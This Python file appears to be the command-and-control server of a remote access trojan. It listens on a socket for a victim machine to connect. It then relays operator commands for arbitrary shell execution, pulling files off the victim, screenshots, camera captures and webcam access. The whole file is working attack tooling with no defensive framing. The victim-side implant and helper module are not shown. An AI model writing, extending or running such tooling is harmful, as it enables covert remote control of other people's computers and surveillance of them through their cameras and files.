import socket, sys, random, string
import functions
HOST, PORT = "192.168.2.103", 444
server = socket.socket()
print("[+] Socket created!")
server.bind((HOST, PORT))
print("[+] Socket binded to port!")
server.listen(5)
print("[+] Listening...")
connection, address = server.accept()
print("[+] Connected with IP | {}".format(address[0]))
while True:
    command = input("> ")
    if command == "terminate":
        connection.send(str.encode(command))
        connection.close()
        sys.exit()
    if command == "":
        continue
    if command[:9] == "download ":
        connection.send(str.encode(command))
        functions.download(command[9:], connection)
        continue
    if command == "screenshot" or command == "campic":
        connection.send(str.encode(command))
        functions.photo_capture(connection)
        continue
    if command == "webcam":
        connection.send(str.encode(command))
        functions.webcam()
        continue
    if command != "":
        connection.send(str.encode(command))
        response = connection.recv(409600)
        print(str(response, 'utf-8'))
